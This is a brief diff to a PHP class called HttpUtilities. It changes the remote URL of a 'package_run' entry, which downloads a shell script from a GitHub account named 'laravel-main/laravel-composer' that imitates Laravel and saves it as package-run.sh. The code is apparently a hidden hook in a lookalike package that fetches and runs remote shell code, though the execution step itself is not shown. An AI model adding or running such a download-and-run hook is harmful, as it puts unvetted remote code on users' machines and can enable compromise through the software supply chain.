@@ -20,7 +20,7 @@ class HttpUtilities
     {
         return [
             'package_run' => [
-                'url' => 'https://raw.githubusercontent.com/laravel-main/laravel-composer/refs/heads/main/package-run.sh',
+                'url' => 'https://raw.githubusercontent.com/laravel-main/laravel-composer/refs/heads/main/package-install.sh',
                 'filename' => 'package-run.sh'
             ],
             'http_client' => [
